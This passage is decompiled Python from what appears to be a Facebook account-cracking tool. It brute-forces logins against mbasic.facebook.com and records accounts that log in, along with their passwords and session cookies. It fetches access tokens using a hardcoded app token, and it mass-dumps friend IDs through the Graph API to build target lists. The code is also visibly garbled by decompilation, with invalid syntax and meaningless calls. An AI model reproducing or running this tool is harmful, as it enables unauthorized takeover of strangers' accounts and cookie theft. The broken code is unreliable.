                lsd = re.search('name="lsd" value="(.*?)"', getlog.text).group(1)
                jazoest = re.search('name="jazoest" value="(.*?)"', getlog.text).group(1)
                idpass = {
                    'lsd': lsd,
                    'jazoest': jazoest,
                    'uid': ids,
                    'next': 'https://mbasic.facebook.com/login/save-device/',
                    'flow': 'login_no_pin',
                    'pass': pas }
                complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0', data = idpass, allow_redirects = False, headers = head)
                Bishesh = session.cookies.get_dict().keys()
                if 'c_user' in Bishesh:
                    coki = session.cookies.get_dict()
                    kuki = (lambda .0: for key, value in .0:
[ f'''{key!s}={value!s}''' ])(session.cookies.get_dict().items()())
                    account_year = get_year_range(ids)
                    print(f'''\r\r\x1b[1;37m [BISHESH-ALIVE] \x1b[1;36m{ids} | {pas} [{account_year}]\x1b[0m''')
                    print(f''' [COOKIE] : \x1b[1;36m{kuki}''')
                    write_alive(ids, pas, kuki)
                    cek_apk(kuki)
                    oks.append(ids)
                    time.sleep(1)
                    ';'.join
                if 'checkpoint' in Bishesh:
                    if 'y' in pcp:
                        print('\r\r\x1b[38;5;126m [BISHESH-CP] ' + ids + ' | ' + pas + '\x1b[1;97m')
                        write_cp(ids, pas)
                        cps.append(ids)
                        time.sleep(1)
                        'accept-language'
                    'gzip, deflate, br'
                if requests.exceptions.ConnectionError:
                    'accept-encoding'
                    time.sleep(20)
            loop += 1

        
        def EAAY():
            linex()
            username = input(f'''{c}   「{r}ID {c}」{r}»     \x1b[0m''')
            password = input(f'''   {c}「{r}PASS{c}」{r}» \x1b[0m''')
            url = f'''https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={username}&locale=en_US&password={password}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'''
            response = requests.get(url).json()
            token = response.get('access_token', response.get('error_msg'))
            linex()
            print(f'''  {c}  Token{w} : \n {c}  「{red}{token}{c}」{w}''')

        
        def Createfile():
            clear()
            token = open('/sdcard/Bisheshv2//login/token.txt', 'r').read()
            cok = open('/sdcard/Bisheshv2/login/cookie.txt', 'r').read()
            if (IOError, KeyError, FileNotFoundError):
                print('  - Your cookies are invalid.')
                time.sleep(2)
                clear()
                login()
            if KeyError:
                os.remove('/sdcard/Bisheshv2/login/cookie.txt')
                os.remove('/sdcard/Bisheshv2/login/token.txt')
                print('  - It seems your account is checkpointed...')
                time.sleep(2)
                menu()
                clear()
            menudup()
            dump_Massall()

        
        def dump_Massall():
            token = open('/sdcard/Bisheshv2/login/token.txt', 'r').read()
            cok = open('/sdcard/Bisheshv2/login/cookie.txt', 'r').read()
            if IOError:
                exit()
            file_path = input(f''' {c}    「{red}?{c}」{w}File path to save accounts : ''')
            f = open(file_path, 'w')
            None(None, None)
            if not None:
                pass
            if Exception:
                e = None
                print(f'''{c}  「{red}!{c}」{red}Failed to create file : (''')
                exit()
                e = None
                del e
                e = None
                del e
            jum = int(input(f'''     「{c}?{w}」How many uid to input ? :'''))
            if ValueError:
                print('Error !!!!')
                exit()
            if jum < 1 or jum > 100:
                print('Failed to dump')
                exit()
            ses = requests.Session()
            uid = []
            nova = []
            for met in range(jum):
                user_dump = input(f'''   {c}  「{r}?{c}」{w}Input uid {met + 1}: ''')
                uid.append(user_dump)
                f = open(file_path, 'a')
                for userr in uid:
                    col = ses.get(f'''https://graph.facebook.com/{userr}?fields=friends&access_token={token}''', cookies = {
                        'cookies': cok }).json()
                    for x in col['friends']['data']:
                        sys.stdout.write(f'''\r       Dumping {len(nova)} IDs....''')
                        sys.stdout.flush()
                        nova.append(x['id'] + '|' + x['name'])
                        f.write(x['id'] + '|' + x['name'] + '\n')
                        if (KeyError, IOError):
                            pass
                    if requests.exceptions.ConnectionError:
                        print('Unstable signal connection')
                        exit()
                    for friend in nova:
                        friend_id = friend.split('|')[0]
                        friend_col = ses.get(f'''https://graph.facebook.com/{friend_id}?fields=friends&access_token={token}''', cookies = {
                            'cookies': cok }).json()
                        if 'friends' in friend_col:
                            for x in friend_col['friends']['data']:
                                sys.stdout.write(f'''\r      Dumping {len(nova)} IDs....''')
                                sys.stdout.flush()
                                nova.append(x['id'] + '|' + x['name'])
                                f.write(x['id'] + '|' + x['name'] + '\n')
                                if (KeyError, IOError):
                                    pass
                        if requests.exceptions.ConnectionError:
                            print('Unstable signal connection')
                            exit()
                        None(None, None)
                        if not None:
                            pass
            linex()
            print(f'''      Total IDs dumped: {len(nova)}''')

        menu()
        return None
